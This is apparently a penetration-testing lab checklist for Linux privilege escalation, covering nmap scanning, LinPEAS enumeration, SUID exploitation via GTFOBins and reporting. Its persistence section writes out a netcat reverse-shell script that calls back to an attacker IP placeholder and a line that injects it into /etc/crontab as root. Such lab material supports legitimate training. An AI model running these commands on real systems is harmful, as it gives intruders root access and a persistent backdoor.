# Privilege Escalation Lab Checklist

## 🔍 Enumeration Phase

- [ ] Run `ifconfig/ip a` to confirm network connectivity
- [ ] Scan target using Nmap

  - [✓] `nmap -sC -sV -Pn 192.168.0.14`
  - [✓] `nmap --script vuln 192.168.0.14`

- [ ] Transfer & run LinPEAS on target

  - [ ] `wget/curl linpeas.sh`
  - [ ] `chmod +x linpeas.sh && ./linpeas.sh`

- [ ] Review outputs:

  - [ ] SUID binaries
  - [ ] Cron jobs
  - [ ] Writable files/folders
  - [ ] Kernel exploit vectors
  - [ ] Services running as root

## 🛠 Exploitation Phase

- [ ] Identify SUID binaries (via LinPEAS or `find / -perm -4000`)
- [ ] Check GTFOBins for possible exploit
- [ ] Exploit Nmap SUID for root shell (if available)
- [ ] Confirm privilege escalation with `whoami`

##🔐 Persistence Phase

- [ ] Confirm cron daemon running (`service cron status`)
- [ ] Upload persistence reverse shell script

  ```bash
  echo "#!/bin/bash" > /tmp/back.sh
  echo "nc -e /bin/bash <your_ip> <port>" >> /tmp/back.sh
  chmod +x /tmp/back.sh
  ```

- [ ] Inject cron persistence

  ```bash
  echo "* * * * * root /tmp/back.sh" >> /etc/crontab
  ```

- [ ] Start listener on attacker machine `nc -lvnp <port>`
- [ ] Verify persistence connection triggered

## 📝 Evidence & Documentation

- [ ] Note exploit path used
- [ ] Log timestamps of access & escalation
- [ ] Capture screenshots of successful root & callback
- [ ] Save logs for reporting
- [ ] Summarize attack flow for report

---

✔ **Lab Complete When**:

- Privilege escalated to root
- Persistence callback tested and working
- Documentation completed and stored
